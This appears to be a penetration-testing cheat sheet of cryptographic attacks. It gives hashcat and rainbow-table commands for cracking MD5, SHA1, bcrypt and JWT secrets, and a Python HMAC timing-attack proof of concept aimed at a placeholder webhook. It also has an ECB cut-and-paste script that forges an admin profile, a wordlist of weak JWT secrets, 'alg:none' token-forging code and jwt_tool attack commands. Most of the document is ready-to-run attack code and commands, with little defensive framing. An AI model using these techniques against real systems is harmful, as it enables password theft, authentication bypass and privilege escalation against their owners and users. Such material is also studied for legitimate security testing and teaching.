# Cryptographic Attack Techniques

## MD5 / SHA1 Password Hash Cracking

### Identify Hash Type

```bash
# hash-identifier tool
hash-identifier
> 5f4dcc3b5aa765d61d8327deb882cf99
[+] MD5

# hashid
hashid '5f4dcc3b5aa765d61d8327deb882cf99'
# Output: [+] MD5

# By structure:
# MD5:    32 hex chars        5f4dcc3b5aa765d61d8327deb882cf99
# SHA1:   40 hex chars        5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
# SHA256: 64 hex chars        ...
# bcrypt: $2b$12$...          Always starts with $2b$ or $2a$
# argon2: $argon2id$v=...
# PBKDF2: pbkdf2_sha256$...
```

### hashcat Attack Modes

```bash
# MD5 — dictionary attack
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# MD5 — with rules (mangling, leet speak, etc.)
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# MD5 — brute force (up to 8 chars)
hashcat -m 0 hashes.txt -a 3 '?a?a?a?a?a?a?a?a'

# SHA1 — dictionary
hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt

# SHA256 unsalted — dictionary
hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt

# MySQL 4.1+ SHA1(SHA1(password))
hashcat -m 300 hashes.txt /usr/share/wordlists/rockyou.txt

# bcrypt (12 rounds — very slow)
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt --status

# Django PBKDF2-SHA256
hashcat -m 20400 hashes.txt /usr/share/wordlists/rockyou.txt

# Salted MD5 ($salt$hash format) — need to know salt
# hashcat format: hash:salt or salt:hash depending on mode
hashcat -m 10 'hash:salt' /usr/share/wordlists/rockyou.txt  # md5($pass.$salt)
hashcat -m 20 'hash:salt' /usr/share/wordlists/rockyou.txt  # md5($salt.$pass)
```

### Rainbow Table Attack

```bash
# Using RainbowCrack
rcrack . -h 5f4dcc3b5aa765d61d8327deb882cf99  # MD5 rainbow tables
rcrack . -l hashes.txt

# Pre-computed tables available at:
# - https://crackstation.net/ (online, huge table)
# - Project RainbowCrack tables: md5_loweralpha-numeric#1-9_0_*

# Ophcrack for NTLM/Windows LM hashes
ophcrack -t /path/to/tables -f hashes.txt
```

### Online Cracking Services (for audit documentation)

```
https://crackstation.net/          # MD5, SHA1, SHA256, NTLM — huge free DB
https://hashes.com/en/decrypt/hash # Multiple algorithms
https://md5decrypt.net/            # MD5 specific
```

---

## Timing Attack — HMAC Comparison

### Understanding the Attack

When comparing `expected_hmac == received_hmac` with a regular equality operator:
- Python's string `==` compares character by character and short-circuits on first mismatch
- An attacker who can repeatedly query the endpoint and measure response time can determine correct bytes one at a time
- Each correct byte adds ~10ns to the comparison time (measurable with enough samples)

### Timing Attack PoC

```python
#!/usr/bin/env python3
"""HMAC Timing Attack PoC — requires high-precision timing and many requests"""
import hmac, hashlib, time, requests, statistics

TARGET_URL = "https://target.com/webhook"
PAYLOAD = b'{"event": "payment", "amount": 100}'

def measure_response_time(signature: str, samples: int = 50) -> float:
    """Measure average response time for a given HMAC signature"""
    times = []
    for _ in range(samples):
        start = time.perf_counter_ns()
        requests.post(TARGET_URL,
            data=PAYLOAD,
            headers={
                "Content-Type": "application/json",
                "X-Signature": f"sha256={signature}"
            }
        )
        end = time.perf_counter_ns()
        times.append(end - start)

    # Remove outliers (top/bottom 10%)
    times.sort()
    trimmed = times[5:-5]
    return statistics.median(trimmed)

def oracle(prefix_hex: str) -> float:
    """Returns response time for given hex-encoded HMAC prefix"""
    # Pad with zeros to full HMAC-SHA256 length (64 hex chars)
    signature = prefix_hex.ljust(64, '0')
    return measure_response_time(signature)

def timing_attack():
    """Recover HMAC byte by byte via timing oracle"""
    recovered = ""
    hex_chars = "0123456789abcdef"

    for position in range(64):  # HMAC-SHA256 = 32 bytes = 64 hex chars
        best_char = None
        best_time = 0

        for c in hex_chars:
            candidate = recovered + c
            t = oracle(candidate)

            print(f"  Position {position}, char '{c}': {t:.0f}ns")

            if t > best_time:
                best_time = t
                best_char = c

        recovered += best_char
        print(f"[+] Recovered so far: {recovered}")

    print(f"[!] Recovered HMAC: {recovered}")
    return recovered

# NOTE: Real timing attacks require many samples per character (50-200)
# and low-latency local network. Remote attacks over internet are very noisy.
# This PoC demonstrates the concept; real exploitation requires lab conditions.
```

### Verifying the Vulnerability

```python
import time, hmac, hashlib

# Simulate vulnerable comparison
def vulnerable_verify(received: str, secret: str, payload: bytes) -> tuple:
    expected = hmac.new(secret.encode(), payload, hashlib.sha256).hexdigest()

    start = time.perf_counter_ns()
    result = (expected == received)  # Vulnerable!
    elapsed = time.perf_counter_ns() - start

    return result, elapsed

# Test timing difference for first byte match vs mismatch
secret = "webhook_secret"
payload = b"test payload"
expected = hmac.new(secret.encode(), payload, hashlib.sha256).hexdigest()

# Correct first byte
t_correct = [vulnerable_verify(expected[0] + "x" * 63, secret, payload)[1] for _ in range(1000)]
# Wrong first byte (try 'a' if expected starts with something else)
wrong_first = 'b' if expected[0] != 'b' else 'c'
t_wrong = [vulnerable_verify(wrong_first + "x" * 63, secret, payload)[1] for _ in range(1000)]

import statistics
print(f"Time (correct first byte): {statistics.median(t_correct):.1f}ns")
print(f"Time (wrong first byte):   {statistics.median(t_wrong):.1f}ns")
print(f"Difference: {statistics.median(t_correct) - statistics.median(t_wrong):.1f}ns")
```

---

## ECB Mode Block Analysis

### Understanding ECB Pattern Leakage

AES processes 16-byte blocks. With ECB, identical 16-byte plaintext blocks → identical 16-byte ciphertext blocks. This is most visible in:
- PNG/BMP images (many repeated background pixels form repeated blocks)
- Structured plaintext like JSON/XML with repeated keys
- User data with common prefixes

### ECB Block Rearrangement Attack

```python
#!/usr/bin/env python3
"""ECB Cut-and-Paste Attack — works when you can control plaintext and observe ciphertext"""
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# Simulated vulnerable server — encrypts profile data with ECB
KEY = get_random_bytes(16)

def encrypt_profile(email: str) -> bytes:
    profile = f"email={email}&role=user&admin=false"
    # Pad to 16-byte boundary
    data = profile.encode()
    pad = 16 - (len(data) % 16)
    data += bytes([pad] * pad)

    cipher = AES.new(KEY, AES.MODE_ECB)
    return cipher.encrypt(data)

def decrypt_profile(ciphertext: bytes) -> dict:
    cipher = AES.new(KEY, AES.MODE_ECB)
    data = cipher.decrypt(ciphertext)
    # Remove padding
    pad = data[-1]
    data = data[:-pad]
    # Parse
    return dict(pair.split('=') for pair in data.decode().split('&'))

# Step 1: Understand block boundaries
# email=AAAAAAAAAA  (16 chars) → block 1: "email=AAAAAAAAAA"
# &role=user&admin  → block 2: "&role=user&admin"
# =false            → block 3: "=false" + padding

# Step 2: Craft input so "admin=true" lands on its own block boundary
# email= (6 chars) + 10 chars padding + "admin=true" + 6 chars padding
craft_email_1 = "A" * 10 + "admin=true" + "\x06" * 6 + "@x.com"
ct1 = encrypt_profile(craft_email_1)
admin_block = ct1[16:32]  # This block contains "admin=true\x06\x06\x06\x06\x06\x06"

# Step 3: Craft normal-looking email that positions role at block boundary
# email=test@x.com  → 16 chars exactly
craft_email_2 = "test@x.com"
ct2 = encrypt_profile(craft_email_2)
prefix_blocks = ct2[:32]  # First two blocks: email + &role=user&admin

# Step 4: Replace last block with crafted admin block
forged_ct = prefix_blocks + admin_block

# Step 5: Decrypt forged ciphertext
profile = decrypt_profile(forged_ct)
print(f"Forged profile: {profile}")
# Output: {'email': 'test@x.com', 'role': 'user', 'admin': 'true'}
```

### Visual ECB Pattern Analysis

```python
#!/usr/bin/env python3
"""Visualize ECB block repetition in encrypted data"""
from Crypto.Cipher import AES

def analyze_ecb_blocks(ciphertext: bytes) -> dict:
    """Detect repeated 16-byte blocks — indicator of ECB mode"""
    block_size = 16
    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]

    block_counts = {}
    for block in blocks:
        block_hex = block.hex()
        block_counts[block_hex] = block_counts.get(block_hex, 0) + 1

    repeated = {k: v for k, v in block_counts.items() if v > 1}
    return repeated

# Test with known plaintext
KEY = b'\x00' * 16
cipher = AES.new(KEY, AES.MODE_ECB)

# Repeated plaintext blocks → repeated ciphertext blocks
plaintext = b"AAAAAAAAAAAAAAAA" * 4  # 4 identical 16-byte blocks
ciphertext = cipher.encrypt(plaintext)

repeated = analyze_ecb_blocks(ciphertext)
if repeated:
    print(f"[!] ECB mode detected — {len(repeated)} repeated block(s):")
    for block_hex, count in repeated.items():
        print(f"    Block {block_hex}: appears {count} times")
```

---

## Known-Weak JWT Secrets

A wordlist of commonly used JWT secrets for brute-force testing:

```
secret
password
123456
admin
test
jwt
jwt_secret
mysecret
app_secret
session_secret
your-256-bit-secret
your-secret-key
change_me
changeme
development
production
test_secret
secret_key
private_key
key
token
jwt_token
jwttoken
apikey
api_key
supersecret
topsecret
shhh
s3cr3t
p@ssw0rd
P@ssw0rd
Passw0rd
SecretKey
MySecretKey
JWTSecret
JWT_SECRET
APP_SECRET
SECRET_KEY
flask-secret
django-insecure
rails-secret
DJANGO_SECRET_KEY
FLASK_SECRET_KEY
express-secret
node-secret
spring-secret
HS256KEY
RS256KEY
abcdefg
1234567890
qwerty
letmein
password123
admin123
root
toor
master
default
example
demo
dev
staging
prod
production123
```

```bash
# Create wordlist and run hashcat
cat > jwt_secrets.txt << 'EOF'
secret
password
123456
jwt_secret
mysecret
change_me
changeme
development
your-secret-key
your-256-bit-secret
EOF

# Crack
hashcat -m 16500 "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.TARGET_JWT" jwt_secrets.txt
```

---

## JWT None Algorithm Bypass Payloads

### Manual Payload Crafting

```bash
# Original token (example structure)
ORIGINAL="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0Iiwicm9sZSI6InVzZXIifQ.SIG"

# Python one-liner to forge with alg:none
python3 -c "
import base64, json

def b64url(data):
    if isinstance(data, dict):
        data = json.dumps(data, separators=(',',':')).encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# Try each case variant of 'none'
for alg in ['none', 'None', 'NONE', 'nOnE']:
    header = b64url({'alg': alg, 'typ': 'JWT'})
    payload = b64url({'sub': '1234', 'role': 'admin', 'exp': 9999999999})
    print(f'{alg}: {header}.{payload}.')
"
```

### jwt_tool Usage

```bash
# Install
pip3 install jwt_tool
# or
git clone https://github.com/ticarpi/jwt_tool && cd jwt_tool && pip3 install -r requirements.txt

# Check token
python3 jwt_tool.py TOKEN

# Test all known attacks automatically
python3 jwt_tool.py TOKEN -t https://target.com/api/endpoint -rh "Authorization: Bearer TOKEN" -M at

# Algorithm confusion attack
python3 jwt_tool.py TOKEN -X a  # Algorithm confusion

# None algorithm
python3 jwt_tool.py TOKEN -X n  # None algorithm

# Brute force key
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Tamper payload (set admin=true)
python3 jwt_tool.py TOKEN -T  # Interactive tamper mode
```
